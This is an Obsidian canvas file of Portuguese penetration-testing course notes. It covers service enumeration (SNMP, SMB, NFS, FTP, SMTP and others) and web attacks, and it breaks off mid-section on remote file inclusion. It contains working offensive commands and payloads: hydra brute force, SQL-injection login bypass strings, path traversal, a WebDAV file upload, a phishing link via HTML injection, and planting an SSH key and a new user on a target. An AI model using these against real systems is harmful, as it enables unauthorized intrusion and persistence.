{
	"nodes":[
		{"id":"5e74d822249401c8","type":"text","text":"# Metodologia Pentest","x":438,"y":-370,"width":533,"height":90,"color":"#c800d6"},
		{"id":"9608105bae9fd053","type":"text","text":"## Enumeraçao","x":6723,"y":-360,"width":266,"height":80,"color":"6"},
		{"id":"89b73c01c10062ae","type":"text","text":"## Enumerando SNMP\n\nEnumerando SNMP porta 161\n![[Screenshot_316.png]]\n![[Screenshot_317.png]]\npara achar as oid ou mib use estes sites\n\n[www.alvestrand.no/objectid](http://www.alvestrand.no/objectid)/1.3.6.1.2.1.html [www.oid-info.com/](http://www.oid-info.com/) [oidref.com](http://oidref.com/)\n\n![[Screenshot_318.png]]\n\n```kali\nnmap -sVU -p161 -Pn 172.16.1.4 172.16.1.247\n```\n![[Screenshot_319.png]]\n\ntemos outa forma para enumerar usando o onesixtyone\nenumeracao com nmap e onesix (/usr/share/wordlists/metasploit/)\npodemos criar uma lista de comunits\n```kali\npublic\nprivate\ncisco\nmanager\njuniper\n```\n\nVamos varer a rede\n```kali\nonesixtyone -c comu.txt 172.16.1.0/24\n```\n![[Screenshot_320.png]]\n\nVamos enumerar uma delas\n```kali\nsnmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25\n```\n![[Screenshot_321.png]]\n\npara uma varredura completa e so remover o codigo no final pois ali so esta enumerando por usuarios\n```kali\nsnmpwalk -c public -v1 172.16.1.4 \n```\n\nvamos instalar um pacote para fazer esta busca\n```kali\napt install snmp-mibs-downloader\necho \"\" > /etc/snmp/snmp.conf\n```\n\nAgora podemos realizar o snmpwalk novamente ele ira mostrar os detalhes(sempre usar isso para enumerar)\n```kali\nsnmpwalk -c public -v1 172.16.1.4 \n```\n![[Screenshot_322.png]]\n\nPodemos usar o snmptraslate para pegar e traduzir algumas delas\n```kali\nsnmptranslate -IR sysUpTime\n```\n![[Screenshot_323.png]]\n\npodemos agora fazer uma consulta mais detalhada\n```kali\nsnmptranslate -Td SNMPv2-MIB::sysUpTime\n```\n![[Screenshot_324.png]]\n","x":7870,"y":-6430,"width":880,"height":1050,"color":"3"},
		{"id":"20e89dd2fb3fe9a7","type":"text","text":"## Enumerando SSH\n\nPor padrão o SSH roda na porta 22, o ssh e utilizado para gerenciar um certo servidor ou dispositivo.\n```kali\nnmap --open -p22,2222 -Pn 172.16.1.0/24\n```\n\nVamos fazer um banner grabing\n```kali\nnc 172.16.1.1 22\n```\n![[Screenshot_308.png]]\n\nPossivel metodo de autentificacao (senha ou chave publica)\nvamos aprender a autenticar por chave publica na proxima aula\n```kali\nssh -v 172.16.1.1\n```\n![[Screenshot_309.png]]\n","x":7870,"y":-5270,"width":880,"height":1050,"color":"3"},
		{"id":"b0c602e4465a463c","type":"text","text":"## Enumerando dispositivos de rede TELLNET\n\nTELLNET porta 23, normalmente utilizado para uma interface administrativa, ele e mais utilizado em ROUTERS/SWITCHS/FIREWALLS\n![[Screenshot_299.png]]\n![[Screenshot_300.png]]\n![[Screenshot_301.png]]\n![[Screenshot_302.png]]\n\nVamos fazer a enumeracao\n```kali\nnmap --open -sS -p 23 -Pn 172.16.1.0/24\n```\n![[Screenshot_303.png]]\n\nVamos se conectar ao telnet\n```kali\ntelnet 172.16.1.247\n```\n![[Screenshot_304.png]]\n\naqui no casso e um juniper, podemos procurar por credencias padrao dele, uma vez conectado ao telnet podemos executar alguns comandos\n```kali\nshow interfaces\n```\n![[Screenshot_305.png]]\n\n","x":6886,"y":-5270,"width":880,"height":1050,"color":"3"},
		{"id":"a8a410ace8774dad","type":"text","text":"## Enumerando MySQL\n\nMySQL e basicamente um base de dados e por padrão se encontra na porta 3306\n```kali\nnmap --open -sS -p 3306 -Pn 172.16.1.0/24\n```\n![[Screenshot_327.png]]\nvamos nos conectar no mysql\n```kali\nmysql -h 172.16.1.5 -u usuario -p rooy\n```\n![[Screenshot_328.png]]\n```kali\nshow databases;\nuse owasp10;\nshow tables;\nselect * from credit_cards\n```\n\nbom aqui nao a muito oque fazer porque para acessar o mysql precisamos da senha e usuario, podemos fazer um bruteforce usando o hydra\n[https://ed4m4s.blog/master-1/mysql-enum#brute-force-credentials](https://ed4m4s.blog/master-1/mysql-enum#brute-force-credentials)\n```kali\nhydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 mysql -t 4\n```","x":6886,"y":-6430,"width":880,"height":1050,"color":"3"},
		{"id":"2a56322eb0305a16","type":"text","text":"## Enumerando Network File System\n\nO FFS funciona na porta 2049 tcp, protocolo para compartilhamento de arquivos para rede linux\n```kali\nnmap --open -sS -p 2049 -Pn 172.16.1.0/24\n```\n![[Screenshot_311.png]]\n\nVamos enumerar\n```kali\nrpcinfo -p 172.16.1.5 | grep nfs\n```\n![[Screenshot_312.png]]\n\nOlha os compartilhamentos exportados ou compartilhados\n```kali\nshowmount -e 172.16.1.5\n```\naqui no caso temos a raiz do sistema que e muito grave isso estar sendo compartilhado\n![[Screenshot_313.png]]\n\nVamos fazer isso em outro host\n```kali\nshowmount -e 172.16.1.31\n```\n![[Screenshot_314.png]]\n\nvamos criar um diretorio na nossa maquina para poder montar os aquivos\ne vamos montar o diretorio da camila\n```kali\nmkdir /tmp/nfs\nmount -t nfs -o nfsvers=2 172.16.1.5:/home/camila/ /tmp/nfs\ncd /tmp/nfs \n\n```\n![[Screenshot_315.png]]\n","x":8870,"y":-5270,"width":880,"height":1050,"color":"3"},
		{"id":"3e1d60da3538c52d","type":"text","text":"## Identificando Firewall\n\nPrograma para fazer a pesquisa\n```kali\nwafw00f tesla.com\n```\n![[Screenshot_267.png]]\n","x":6916,"y":-1810,"width":819,"height":1100,"color":"4"},
		{"id":"f9f66f93ecbb5c7f","type":"text","text":"## Enumerando FTP\n\nScanning\n```kali\nnmap -v -sV -p21,2121 -Pn --open 172.16.1.0/24 -oG ftp\n```\n\n\nVamos se conectar em alguns dos ips que achamos\n```kali\nnc -vn 172.16.1.240 2121\n```\n\nAgora precisamos saber como interagir e como funciona o ftp\napos nos conectarmos podemos mandar comandos\n```kali\nnc -vn 172.16.1.108 21\nUSER kair\nPASS 123\nQUIT\n```\n\nPodemos fazer de outro geito tambem\n```kali\nftp 172.16.1.108\n```\n\nMuitas vezes o ftp vem com o usuario e senha anonnymous da qual podemos se conectar\n```kali\nftp 172.16.1.108\nanonymous\nanonymous\n```\n\ntambem podemos fazer isso com ftp ftp\n```kali\nftp 172.16.1.108\nftp\nftp\n```\n\n","x":7870,"y":-1810,"width":880,"height":1100,"color":"3"},
		{"id":"27357498336161f1","type":"text","text":"## Enumerando NetBios_Smb no Linux\n\nScan\n```kali\nnmap -v -sV -p139,445 -Pn --open 172.16.1.0/24\n```\n\nEnumeracao\nvamos fazer o scan da rede por netbios e smb\n```kali\nnbtscan -r 172.16.1.0/24\n```\n![[Screenshot_285.png]]\n\n```kali\nsmbclient -L \\\\172.16.1.5\n```\n![[Screenshot_286.png]]\n\nPodemos passar tambem um usuarios\n```kali\nsmbclient -L \\\\172.16.1.5 -N -U administrator\n```\n![[Screenshot_287.png]]\n\nVamos se conectar aos diretorios\n```kali\nsmbclient //172.16.1.5/_DOCS\n```\n![[Screenshot_288.png]]\n\nProblemas que podemos enfrentar com versões de software\n![[Screenshot_289.png]]\nPodemos resolver usando o comando abaixo\n```kali\nsmbclient -L \\\\172.16.1.5 -N --option='client min protocol=NT1'\n```\n","x":8870,"y":-1810,"width":880,"height":1100,"color":"3"},
		{"id":"cb69c5c046c301be","type":"text","text":"## Enumerando SMTP\n\nPor padrão o protocolo SMTP se encontra na porta 25\n```kali\nnmap --open -sS -p 25 -Pn 172.30.0.1/24\n```\n![[Screenshot_295.png]]\n\n```kali\nnc -v 172.30.0.128 25\n```\n![[Screenshot_296.png]]\n\nVamos fazer uma enumeracao de usuario verificando o mesmo\n```kali\nHELO kair\nHELP\nVRFY kira\n```\n\nAqui vemos que o usuario ricardo nao existe, mas o usuario root existe\n![[Screenshot_297.png]]\n\nvamos verificar isso mandando um email\n```kali\nnc -v 172.30.0.128 25\nmail from: pentest\nrcpt to: root\nDATA isso e um assunto\n\nola root tudo bem?\n.\n```\n![[Screenshot_298.png]]\n","x":6886,"y":-4110,"width":880,"height":1050,"color":"3"},
		{"id":"132bb9150e85d271","type":"text","text":"## Enumerando  HTTP\n\n![[Screenshot_256.png]]\n![[Screenshot_257.png]]\n\nVamos fazer a enumeracao\n```kali\nnc -v businesscorp.com.br 80 \nHEAD / HTTP/1.0\n```\n![[Pasted image 20230204111031.png]]\n\n```kali\nnc -v businesscorp.com.br 80 \nOPTIONS /desec HTTP/1.0\n```\n![[Screenshot_258.png]]\n\n```kali\nnc -v businesscorp.com.br 80 \nOPTIONS / HTTP/1.1\nHost: site.com.br\n```\n![[Screenshot_259.png]]\n\n```kali\nnc -v businesscorp.com.br 80 \nHEAD / HTTP/1.0\n```\n![[Screenshot_260.png]]\n\n```kali\nnc -v businesscorp.com.br 80 \nGET /index.aspx HTTP/1.0\n```\n![[Screenshot_261.png]]\n","x":6886,"y":-2950,"width":880,"height":1050,"color":"3"},
		{"id":"635d1babbadd2f23","type":"text","text":"## Enumerando POP3\n\nPOP3 se encontra na porta 110, e normalmente usada como caixa de entrada um imbox do correio eletrônico de email.\n```kali\nnmap --open -sS -p 110 -Pn 37.59.174.224-239\n```\n![[Screenshot_292.png]]\n\n```kali\nnc -v 37.59.174.227 110\nUSER admin\nPASS admin\n```\n![[Screenshot_293.png]]\n\ncomo olhamos em aula passada temos um leake do usuario e senha da camila\n```kali\ntelnet 37.59.174.227 110\nUSER camila\nPASS ca123456\nLIST\nRETR 1\n```\n![[Screenshot_294.png]]\n","x":7870,"y":-4110,"width":880,"height":1050,"color":"3"},
		{"id":"6cd1d33f3da163f6","type":"text","text":"## Enumerando HTTPS\n\nO https funciona por padrão na porta 443 o ncat nao consegue lidar com a criptografia do https, mas o openssl consegue lidar com ela, vamos usa-lo para fazer a enumeração\n\n```kali\nopenssl s_client -quiet -connect tesla.com:443\n```\n\n```kali\nHEAD / HTTP/1.1\nHost: tesla.com\n```\n![[Screenshot_262.png]]\n\n```kali\nopenssl s_client -quiet -connect www.tesla.com:443\n```\n\n```kali\nHEAD / HTTP/1.1\nHost: www.tesla.com\n```\n![[Screenshot_263.png]]\n\nidentificacao de proxy \nvemos que ele esta redirecionando\n```kali\nopenssl s_client -quiet -connect www.serasa.com.br:443\nHEAD / HTTP/1.1\nHost: www.serasa.com.br\n```\n![[Screenshot_264.png]]\n\ncaso nos fazermos a request sem passa um host ele ira mostrar o proxy que ele faz, e mostra que tem firewall\n![[Screenshot_265.png]]\n\nVamos fazer a conexao no host que foi redirecionado\n```kali\nopenssl s_client -quiet -connect www.serasaexperian.com.br:443\nHEAD / HTTP/1.1\nHost: www.serasaexperian.com.br\n```\n![[Screenshot_266.png]]\n","x":7870,"y":-2950,"width":880,"height":1050,"color":"3"},
		{"id":"5340ca4bf3f74826","type":"text","text":"## Enumerando NetBios_Smb no Windows\nVamos rodar o nmap antes de ir para o windows\n```kali\nnmap -v -sV -p139,445 -Pn --open 172.16.1.0/24\n```\n![[Screenshot_276.png]]\n\nAgora vamos para o cmd do windows\n```cmd\nnbstat -A 172.16.1.4\n```\n![[Screenshot_277.png]]\n\nVamos enumerar essas maquinas\n```cmd\nnet view \\\\172.16.1.5\n```\nvai dar um erro pelo fato que nao temos permisao de acesso\n![[Screenshot_278.png]]\n\nVamos tentar em outro\n```cmd\nnet view \\\\172.16.1.4\n```\nAqui no caso ja conseguimos acesar\n![[Screenshot_279.png]]\n\nNo host que deu erro talvez conseguimos acessalo se iniciarmos uma sessao nula sem usuario e sem senha, vamos fazer isto\n```cmd\nnet use \\\\172.16.1.5 \"\" /u:\"\"\n```\n![[Screenshot_280.png]]\n\nAgora se tentarmos dar o net view conseguimos visualizar\n```cmd\nnet view \\\\172.16.1.5\n```\n![[Screenshot_281.png]]\n\nvamos ver o cache das maquinas que nos estamos interagindo\n```cmd\nnbstat -c\n```\n![[Screenshot_282.png]]\n\nVamos ver oque tem no 172.16.1.5\n```cmd\nnet use\nnet view \\\\172.16.1.5\n```\n![[Screenshot_283.png]]\n\nVamos nos conectar ao opt\n```cmd\nnet use h: \\\\172.16.1.5\\opt\nnet use\nh:\n```\n![[Screenshot_284.png]]\n\nPara deletar este h basta apenas colocar o comando\n```cmd\nnet use h: /delete\n```\nPara deletar a sessao basta apenas colocar o comando\n```cmd\nnet use \\\\172.16.1.5 /delete\n```","x":8870,"y":-2950,"width":880,"height":1050,"color":"3"},
		{"id":"2b4b6311febe38a3","type":"text","text":"## Enumerando com RPC\n\n```kali\nrpcclient -U \"\" -N 172.16.1.5\n?\n```\n![[Screenshot_290.png]]\n\nPara enumerar os usuario\n```kali\nenumdomusers\n```\n\nPara ver informacoes dos usuarios\n```kali\nqueryuser root\n```\n\nInformacaoes sobre compartilhamentos\n```kali\nnetshareenum\nnetshareenumall\n```\n","x":8870,"y":-4110,"width":880,"height":1050,"color":"3"},
		{"id":"3304692f3484351b","type":"text","text":"## Script para Automaçao NetBios_SMB\n\n```kali\nenum4linux -U 172.16.1.5    #informacoes de usuarios\nenum4linux -S 172.16.1.5    #informacoes de compartilhamento\nenum4linux -a 172.16.1.5    #informacoes de tudo\nenum4linux -a 172.16.1.5 -u igor -p 123  #usuario e senha\n```","x":5957,"y":-987,"width":710,"height":277,"color":"5"},
		{"id":"579d338576be5192","type":"text","text":"## Autenticação com chave pública ssh\n\nMapeamos o nosso servico ssh \n```kali\nssh -v 192.168.0\n```\n\nvemos que esta permitingo a chave publica e a senha\n![[Screenshot_310.png]]\n\nPara conseguimos se cadastrar com a chave publica precisamos gerar uma chave no nosso kali e cadastrar no alvo\n\nVamos gerar uma chave publica\n```bash\nssh-keygen\n```\n![[Pasted image 20230204165915.png]]\n\nVamos ao servidor alvo e vamos cadastrar a nossa key\n```kali\ncd /root/.ssh/\nnano authorized_keys\nservice ssh restart\n```\n\nATACANTE\n\n```bash\nssh-add idid_rsa\nssh -v 192.168.0.11\n```\n\nALVO\n\ncasso a autenticacao por root esteja desativada podemos criar ou usar um usuario ja existente aqui no caso estamos adicionando um usuario, mas casso queira pegar um existente basta criar na sua maquina um usuario com o mesmo nome e gerar a ssh key apartir dele\n\n```bash\nadduser desec\n123\n```\n\n```bash\ncd /home/desec\nmkdir .ssh\ncd .ssh\ncp /root/.ssh/authorized_keys .\n```\n\nATACANTE\n\n```bash\nssh -v desec@92.168.0.11\n```\n\ncaso de um erro deste tipo abaixo fassa isto\n![[Pasted image 20230204170312.png]]","x":5871,"y":-2257,"width":880,"height":1050,"color":"5"},
		{"id":"1377be088be4aca0","type":"text","text":"## Alterando informações via SNMP\n\ncaso nos tenhamos permissão de escrita conseguimos não so ler dados mas também gravar dados\n```kali\nsnmp-check 172.16.1.4 -c public   ##sem premisao para escrever\nsnmp-check 172.16.1.4 -c manager  ##com permisao para escrever\n```\n\n```kali\nsnmpwalk -c manager -v1 172.16.1.247\n```\n\nvamos alterar esta string\n![[Screenshot_325.png]]\n```kali\nsnmpset -c manager -v1 172.16.1.247 SNMPv2-MIB::sysContact.0 s \"Desec\"\n```\n![[Screenshot_326.png]]\n","x":5871,"y":-3247,"width":880,"height":760,"color":"5"},
		{"id":"529d45060787c429","type":"text","text":"## Scanners de Vulnerabilidades\n\n![[Pasted image 20230204201325.png]]\n![[Screenshot_336.png]]\n![[Pasted image 20230204201342.png]]\n\n## Vantagens e Desvantagens\n\n![[Screenshot_337.png]]\n\n## Exemplos de uso\n![[Screenshot_338.png]]\n![[Screenshot_339.png]]\n![[Screenshot_340.png]]\n\n![[Pasted image 20230204202027.png]]\n![[Screenshot_342.png]]","x":8045,"y":1286,"width":705,"height":1100,"color":"4"},
		{"id":"f64195d968ebbb24","type":"text","text":"## NMAP NSE\n```kali\ncd /usr/share/nmap/scripts\ngrep \"ftp\" script.db\n```\n![[Screenshot_371.png]]\n```kali\nnmap -p21 --script ftp-vsftpd-backdoor.nse -Pn 172.16.1.5\n```\n![[Screenshot_372.png]]\npodemos ver o nano do script para ver se ele aceita argumentos\n```kali\nnano ftp-vsftpd-backdoor.nse\n```\n![[Screenshot_373.png]]\n```kali\nnmap -p21 --script ftp-vsftpd-backdoor.nse --script-args cmd=ls -la -Pn 172.16.1.5\n```\n![[Screenshot_374.png]]\n","x":8045,"y":2536,"width":705,"height":1100,"color":"1"},
		{"id":"6c8b7d030f931a5f","type":"text","text":"## Pesquisa manual por vulnerabilidades\n\n![[Screenshot_331.png]]\n\n![[Pasted image 20230204200429.png]]\nhttps://www.exploit-db.com/\n![[Pasted image 20230204200436.png]]\nhttps://nvd.nist.gov/\n![[Screenshot_333.png]]\nhttps://www.rapid7.com/db/\n![[Screenshot_334.png]]\n\n```kali\nsearchsploit webmin\n```\n![[Screenshot_335.png]]\n","x":8045,"y":66,"width":705,"height":1100,"color":"4"},
		{"id":"a3afb6be60781d32","type":"text","text":"## Analise de Vulnerabilidade","x":8157,"y":-360,"width":480,"height":80,"color":"6"},
		{"id":"fc6ab3d07a45b7de","type":"text","text":"## GET x POST\nO metodo get ele coloca qualquer imput que esteja dentro dele na url \n![[brave_jN1GVdxLHV.png]]\n![[brave_xrZHGUO6yd.png]]\n\nJa o metodo post voce so consegue ver ele com um proxy como o burpsuit\n![[brave_CIdRwP7KPr.png]]\n![[brave_i3iVNFtPN5.png]]\n\n","x":8940,"y":66,"width":669,"height":1220,"color":"#ffd500"},
		{"id":"9d5112e5fd770641","type":"text","text":"## Identificando Métodos Aceitos\n\nVamos verificar alguns metodos aceitos\nlembre que os metodos que estamos pegando sao da raiz ou sera diretorio / podemos fazer isso para todos os diretorios que acharmos \n```kali\ncurl -v -X OPTIONS http://172.16.1.10/\n```\n![[brave_GbdukOHQrM.png]]\n\nVamos fazer isso nos outros diretorios\n```kali\ncurl -v -X OPTIONS http://172.16.1.10/logs\n```\n![[brave_v07vKAwH9H.png]]\n![[brave_IItFukPlJN.png]]\n\nTemos esta forma de pegar os metodos permitidos, mas temos uma outra forma que e se conectando com o alvo\n```kali\nnc -v 172.16.1.10 80 -C\nPUT / HTTP/1.1\nHost: 1722.16.1.10\n```\n![[brave_I1DX9agKET.png]]\n\nVamos fazer o mesmo teste so que com o webdav\n```kali\nnc -v 172.16.1.10 80 -C\nPUT /webdav/teste.php HTTP/1.1\nHost: 1722.16.1.10\n```\nalgo de interesante que acontece aqui e que no webdav ele permite o metodo put e ele acabou criando um arquivo chamado teste.php no servidor\n![[brave_hHysVUFgpu.png]]\n![[brave_YcGvKfJBkf.png]]\nVemos que o webdav tambem tem um DELETE, entao vamos deletar o nosso test.php\n```kali\nnc -v 172.16.1.10 80 -C\nDELETE /webdav/teste.php HTTP/1.1\nHost: 1722.16.1.10\n```\n![[brave_kA8M7saVJ4.png]]\n","x":9750,"y":55,"width":749,"height":1111,"color":"4"},
		{"id":"99ebb1d44385978e","type":"text","text":"## Identificando a superfície de ataque\n\nbasicamente e uma coleta de informacoes para achar e localizar o local de ataque, anteriormente no comeco do ataque fizemos todo um reconhecimento e agora precissamos achar o vetor de ataque olhando para o sistema para entender como ele funciona, quais recursos ele oferece e quais sao os possiveis pontos de entrada\n\n![[brave_itxxrMLj9i.png]]\n\nTemos aqui o campo de login\n![[brave_nBtb8YjpKY.png]]\n\nTemos tambem um de cadastro\n![[brave_N24Pp4yizP.png]]\n\nTemos um campo de ativacao de conta\n![[brave_dshqhmy5Hv.png]]\n\nTemos um capo de pesquisa\n![[brave_FS5CHZcuU5.png]]\n\n","x":10602,"y":66,"width":749,"height":1100,"color":"4"},
		{"id":"ea938e386e66270f","type":"text","text":"## Identificando Arquivos e Diretórios\nVamos procurar por diretorios\n```kali\ngobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt\n```\n\npodemos filtrar quais codigos a ser verificado  \n```kali\ngobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -s \"200,301,302\"\n```\n\npodemos usar o -a para passar o user agent\n```kali\ngobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -a \"userkair\"\n```\n![[brave_AUdRUmVKCx.png]]\n\nSempre que acharmos algo novo podemos fazer um bruteforte de arquivos dentro dos diretorios que achamos\nVamos pesquisar por aquivos\n```kali\ngobuster dir -e -u http://172.16.1.10/turismo/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.sql,.bkp\n```\n![[brave_5Hh8N91KxV.png]]","x":9748,"y":1379,"width":749,"height":1101,"color":"3"},
		{"id":"ce81d8e95a097a88","type":"text","text":"## Analisando o código fonte da página\n\nE sempre bom fazer o reconhecimento do codigo fonte da pagina para localizar diretorios arquivos ou entao redirecionamento para outro local, ate mesmo os comentarios podem te revelar muita coisa, podemos achar apis tipo de versao entre outras coisas\n\nclicando com o botao direito do mouse  conseguimos ver as opcoes, vamos em ver codigo fonte\n![[brave_YhxT19vzwD.png]]\n\nolha so, achamos um endereco de link e outro que esta dessativado \n![[brave_DK9icaJQBV.png]]\n![[brave_yxJHChp9fk.png]]\n![[brave_OMlZmqwqOY.png]]\n\n","x":10600,"y":1379,"width":749,"height":1100,"color":"4"},
		{"id":"0421941ad95bc558","type":"text","text":"## Enumerando  Web","x":9480,"y":-360,"width":360,"height":80,"color":"6"},
		{"id":"3f48d3f1b91a39d6","type":"text","text":"## Metodos aceitos\n\n```kali\nnc -v businesscorp.com.br 80\nHEAD / HTTP/1.0\nGET /index.php HTTP/1.0\n```\n\n```\nnc -v businesscorp.com.br 80\nOPTIONS /desec HTTP/1.0\n```\n\n","x":3868,"y":-1920,"width":666,"height":330,"color":"2"},
		{"id":"9cb8e00bc35378f6","type":"text","text":"## Verificando tecnologias do site ou aplicação\n```kali\nwhatweb -v site.com.br\n```","x":4657,"y":-1920,"width":666,"height":330,"color":"4"},
		{"id":"c2159b61def60e7c","type":"text","text":"## Robots e Sitemap\n\nEm um site pode ter dois arquivos que devemos olhar\n```\nrobots.txt\nsitemap.xml\n```","x":3868,"y":-1480,"width":666,"height":330,"color":"4"},
		{"id":"4995c78f29138d5a","type":"text","text":"## Clonagem de pagina web\n\nVamos clonar a pagina web para melhor entendimento de seu codigo\n```\nwget -m businesscorp.com.br\nwget -m -e robots=off businesscorp.com.br\n```","x":4657,"y":-1480,"width":666,"height":330,"color":"4"},
		{"id":"cf991922d77de479","type":"text","text":"## Listagem de Diretorios\n\n```kali\ndirb http://site.com.br /usr/share/dirb/wordlists/\n\ngobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.sql,.bkp\n\ngobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt -s \"200,301,302,401\"\n```","x":3868,"y":-1040,"width":666,"height":330,"color":"2"},
		{"id":"f6d67c2bb4d2b183","type":"text","text":"## Pegando o HTML da pagina com o curl\n```kali\ncurl site.com.br\ncurl -s --head site.com.br\ncurl -v -H \"User-Agent: Kair\" site.com.br\n```","x":4657,"y":-1040,"width":666,"height":330,"color":"4"},
		{"id":"77052acd1db16b7c","type":"text","text":"## Coleta de Informaçao Web","x":3970,"y":-370,"width":462,"height":90,"color":"6"},
		{"id":"385f43943ca6db9b","type":"text","text":"## Coleta de Informaçao Infra","x":2720,"y":-370,"width":493,"height":90,"color":"6"},
		{"id":"00aa7b4da6fcee8d","type":"text","text":"## Coleta de Informaçao Business","x":1440,"y":-370,"width":529,"height":90,"color":"6"},
		{"id":"7badf503d4512bd4","type":"text","text":"## URL Encode\n\nUrl encode acontece desta forma que esta no link, basicamente e uma url com alguns parametros encodados\n\nPodemos acessar o site para ver como funciona e uma tabela de referencia para encode [https://www.w3schools.com/tags/ref_urlencode.ASP](https://www.w3schools.com/tags/ref_urlencode.ASP)\n\nAqui no link vemos como e um url encode https%3A%2F%2Fbusinesscorp.com.br%2Fpage.php%3Fid%3D1\n![[brave_rnaRGgPq1d.png]]\nhttps://www.w3schools.com/tags/ref_urlencode.ASP\n![[brave_as5EUizSQA.png]]\n\nurl encode acontece quando temos um endereco e ele e encodado em alguns caracteres especiais\n\ncodigo web para teste de url encode\n```php\n<?php\n$hashtag = \"#\";\n$e = \"&\";\n$str = $_GET['char'];\necho rawurlencode($str) . \"<br/>\\n\";\necho \"Exibindo #: \" . rawurlencode($hashtag) . \"<br/>\\n\";\necho \"Exivindo &: \" . rawurlencode($e);\n?>\n```\n![[brave_AuP0s6m9Fi.png]]\n![[brave_hep8vjWDe8.png]]\n","x":10260,"y":-2480,"width":669,"height":1657,"color":"#ffd500"},
		{"id":"81143fa817384a06","type":"text","text":"## Bypass Authentication - SQL Injection\n\nVamos ver se conseguimos identificar um bypass autentication nesta aplicacao \nvamos fazer isso no campo de login\n![[brave_VrLiQKpE7a.png]]\n\nUm teste que podemos fazer e colocando uma contra barra no campo de senha e login\npodemos fazer com contra barra ou com aspas simples\n```\nlogin = \\\nsenha = \\\n```\nvemos que a aplicacao nos traz um erro de sql syntax\n![[brave_RT3eCtsPfp.png]]\n\nVemos que a aplicacao e vulneravel a sql, oque podemos fazer e usar uma daquelas logicas de or que aprendemos \n```\nusuario = ' or 2=2#\nsenha = 123\n```\n\nquando enviamos isso ele acabou se autenticando, nos mostranto ate quem e o 1 usuario que e o mrtur\n![[brave_ERFt9D4uc7.png]]\n![[brave_98BpqWtoCi.png]]\n\nOque podemos fazer e testar outras payloads\n```\nusuario = teste' or id=1#\nsenha = 123\n```\n![[brave_TgrwVQnKW6.png]]\n![[brave_C6AsdEthgZ.png]]\n\nBeleza oque podemos fazer agora e o reconhecimento todo novamente, sendo ele codigo fonte e olhar mas vetores de ataques, ja que estamos logados agora\n![[brave_oKk9s92Gjd.png]]\n\nOlhando o codigo fonte vemos que ele esta reclamando de um banner no diretorio logado.php, podemos da uma olhada nisso via get ou post, vamo fazer isso.\ne acaba que chegamos em um diretorio com 3 imagens\n![[brave_UbK55oXbNx.png]]\n\n","x":13010,"y":-4519,"width":749,"height":1100,"color":"2"},
		{"id":"124f013c960c5ab2","type":"text","text":"## HTML Injection\n\nOcorre quando temos uma parte de pesquisa e podemos mandar codigos html para ela\n![[brave_hnpV8ggBJp.png]]\n\n![[brave_ewyDk297EG.png]]\n![[brave_eNtzxdxx3P.png]]\n\n![[brave_gQHRNJBgMj.png]]\n![[brave_vhazL4mNOH.png]]\n\nbasicamente para explorar a falha basta um pouco de engenharia social, como criar um link malicioso dentro do site\nisso vai gerar um botao clicavel que ira direcionar ao campo de login malicioso \n```\n<a href=\"http://172.90.0.137/\"><h1>50% de desconto</h1></a>\n```\n![[brave_kYHNsHIUoS.png]]","x":13930,"y":-4519,"width":749,"height":1100,"color":"1"},
		{"id":"53680c47741215ba","type":"text","text":"## FPD - Path Traversal - Directory Traversal\n\nfull path disclose e quando voce consegue descobrir o local exato de onde a aplicacao esta rodando\n\ndescobrimos isto na aula passada quando nos nos autenticamos e fizemos a enumeracao no http autenticado, descobrimos analisando o http codigo fonte\n\n/var/www/html/turismo/logado.php\n\n================================================================================\n\nPath transversal e quando conseguimos visualizar tudo que tem dentro de caminhos e diretorios\n\ndescobrimos um diretorio chamado banner quando nos olhamos o codigo fonte do http, se nos acessarmos conseguimos ver algumas imagens\n\nde acordo com o codigo fonte ele esta dando erro ao tentar abrir um diretorio banners, vamos olhar este diretorio e acessar as imagens por la\n\n\nFPD e quando voce consegue descobrir o local exato que uma aplicacao esta rodando, por exemplo na aula passada quando nos autenticamos e olhamos o codigo fonte nos conseguimos obter esta informacao\n![[brave_f9sV6fuagc.png]]\n\nContinuando da parte que paramos, podemos tentar fazer algumas coisas no link do banner \n```\n172.16.1.10/turismo/logado.php?banners='\n```\n\nquando colocamos a aspas simples e olhamos o codigo fonte ele da um erro\no erro no caso e que ele nao consegue abrir o diretorio ``/var/www/html/turismo/banners/'``\n![[brave_JTgOnK8QYJ.png]]\n\noque podemos tentar fazer e abrir aquelas imagens que vimos antes\n```\n172.16.1.10/turismo/banners/orlando.png\n```\n![[brave_jl3z72aKfj.png]]\n![[brave_3Pqi63xKBV.png]]\n\nMuito bem e se nos colocarmos uma / no diretorio banner\n```\n172.16.1.10/turismo/logado.php?banners=/\n```\nele acaba mostrando oque tem dentro do diretorio\n![[brave_3v6YfOjX0g.png]]\n\naqui agora sabendo disso podemos tentar voltar os diretorios\n```\n172.16.1.10/turismo/logado.php?banners=/../\n```\n![[brave_OUs0kx9OYJ.png]]\n\ne assim vai\n```\n172.16.1.10/turismo/logado.php?banners=/../../\n```\n![[brave_3H8rnLg1dW.png]]\n\nvamos acessar este s3cr3tlogs\n```\n172.16.1.10/s3cr3tlogs\n```\n![[brave_cpGP7IbBQz.png]]\n\ne agora e so usar o john para quebrar esta hash\n![[brave_gRiubTpOMw.png]]\n","x":13010,"y":-3221,"width":749,"height":1100,"color":"2"},
		{"id":"69ec6f7713dac483","type":"text","text":"## RFI (Remote File Inclusion)\n\no rfi funciona da mesma forma que o lfi so que o rfi adiciona arquivos de forma remota\nno nosso reconhecimento encontramos um link no codigo fonte com um redirecionamento\n![[brave_qf5tDngHxD.png]]\n![[brave_pFWvTG307o.png]]\n\nVamos remover a parte do redirecionamento e ficar com o restante\n```\n172.16.1.10/turismo/link.php?link=\n```\n\nvemos que ele tenta fazer um include .html, ou seja oque ele esta tentando inserir no link tem .html\n![[brave_QV3v32loud.png]]\n\nvamos fazer o teste e confirmar isso\n```\n172.16.1.10/turismo/link.php?link=ricardo\n```\n![[brave_QUnH33CZHG.png]]\n\nconfirmando isso tambem confirmamos que esta vulneravel a rfi, pois e uma inclusao de arquivos remotos, vamos explorar esta vulnerabilidade, para isso basta subir um servidor remoto e pedimos para que o servidor leia o nosso arquivo \n\nvamos no kali e criar um arquivo 